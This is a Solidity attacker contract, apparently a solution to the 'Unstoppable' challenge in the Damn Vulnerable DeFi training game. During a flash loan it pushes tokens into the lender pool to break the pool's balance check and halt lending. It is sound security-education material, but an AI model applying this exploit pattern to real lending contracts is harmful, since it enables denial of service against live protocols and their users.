// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackerUnstoppable {

    UnstoppableLender private immutable pool;
    address private immutable owner;

    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender;
    }

    // Pool will call this function during the flash loan
    function receiveTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == address(pool), "Sender must be pool");
        // Break pool
        pool.damnValuableToken().transfer(
            address(pool),
            pool.damnValuableToken().balanceOf(address(this))
        );
    }

    function exploit() external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        uint256 tokenBalance = pool.damnValuableToken().balanceOf(address(this));
        pool.flashLoan(tokenBalance);
    }
}